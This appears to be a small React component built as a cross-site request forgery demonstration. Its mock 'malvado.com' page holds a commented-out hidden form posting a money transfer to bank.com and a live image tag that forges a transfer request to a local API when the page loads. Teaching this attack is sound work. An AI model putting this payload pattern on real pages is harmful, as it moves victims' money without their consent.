import React from 'react';

function Evil() {
  return (
    <div style={{ fontFamily: 'Arial', padding: '20px' }}>
      <h1>Site malvado.com</h1>
      <p>Vou tentar te roubar.</p>
      {/* Requisição maliciosa para bank.com 
        
          <form action="http://bank.com/api/transfer" method="POST">
            <input type="hidden" name="amount" value="1000">
            <input type="hidden" name="to" value="hack-account">
            <button type="submit">Transferir</button>
          </form>


      */}
      <img src="http://localhost:3001/api/transfer?amount=1000&to=attacker-account" alt="Malicious request" />
    </div>
  );
}

export default Evil;
